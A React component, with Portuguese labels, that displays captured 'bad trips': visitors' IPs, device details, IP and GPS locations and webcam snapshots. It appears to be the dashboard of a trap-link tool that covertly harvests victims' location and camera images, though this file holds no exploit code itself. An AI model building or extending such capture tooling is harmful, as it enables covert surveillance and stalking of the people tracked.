import { api } from "../../services/api";
import { useCookies } from "react-cookie";
import { useNavigate } from "react-router-dom";
import { useState, useEffect } from "react";

export function BadtripsTable() {
    const navigate = useNavigate();
    const [cookies, setCookie] = useCookies(['session']);
    const [badtrips, setBadtrips] = useState<any[]>([]);
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState<string | null>(null);

    useEffect(() => {
        const initializeSession = async () => {
            try {
                const response = await api.post('/user/start_session');
                setCookie('session', response.data.session, { path: '/' });
                return response.data.session;
            } catch (error) {
                console.error("Error initializing session:", error);
                navigate("/create");
                return null;
            }
        };

        const fetchBadtrips = async (sessionId: string) => {
            try {
                const response = await api.get('/user/get_badtrips', {
                    params: {
                        user_id: sessionId
                    }
                });
                setBadtrips(response.data.badtrips || []);
            } catch (error) {
                setError("Failed to fetch bad trips");
                console.error("Error fetching bad trips:", error);
            } finally {
                setLoading(false);
            }
        };

        const init = async () => {
            let sessionId = cookies.session;
            if (!sessionId) {
                sessionId = await initializeSession();
            }
            if (sessionId) {
                await fetchBadtrips(sessionId);
            }
        };

        init();
    }, [cookies.session, setCookie, navigate]);

    if (loading) {
        return <div>Loading...</div>;
    }

    if (error) {
        return <div>Error: {error}</div>;
    }

    return (
        <div className="badtrips-container">
            <h2>Bad Trips Capturados</h2>
            {badtrips.length === 0 ? (
                <p>Nenhum bad trip encontrado</p>
            ) : (
                <table className="badtrips-table">
                    <thead>
                        <tr>
                            <th>IP</th>
                            <th>Dispositivo</th>
                            <th>Localização por IP</th>
                            <th>Localização por GPS</th>
                            <th>Imagem</th>
                            <th>Data</th>
                        </tr>
                    </thead>
                    <tbody>
                        {badtrips.map((trip, index) => (
                            <tr key={index}>
                                <td>{trip.ip}</td>
                                <td>
                                    {trip.device_data && (
                                        <div>
                                            <div>Navegador: {trip.device_data.browser}</div>
                                            <div>OS: {trip.device_data.os}</div>
                                            <div>Dispositivo: {trip.device_data.device}</div>
                                        </div>
                                    )}
                                </td>
                                <td>
                                    {trip.ip_location && (
                                        <div>
                                            <div>País: {trip.ip_location.country}</div>
                                            <div>Região: {trip.ip_location.region}</div>
                                            <div>Cidade: {trip.ip_location.city}</div>
                                        </div>
                                    )}
                                </td>
                                <td>
                                    {trip.gps_location && (
                                        <div>
                                            <div>Latitude: {trip.gps_location.latitude}</div>
                                            <div>Longitude: {trip.gps_location.longitude}</div>
                                        </div>
                                    )}
                                </td>
                                <td>
                                    {trip.cam_image && (
                                        <img 
                                            src={`data:image/jpeg;base64,${trip.cam_image}`} 
                                            alt="Webcam capture" 
                                            width="100"
                                        />
                                    )}
                                </td>
                                <td>{new Date(trip.created_at).toLocaleString()}</td>
                            </tr>
                        ))}
                    </tbody>
                </table>
            )}
        </div>
    );
}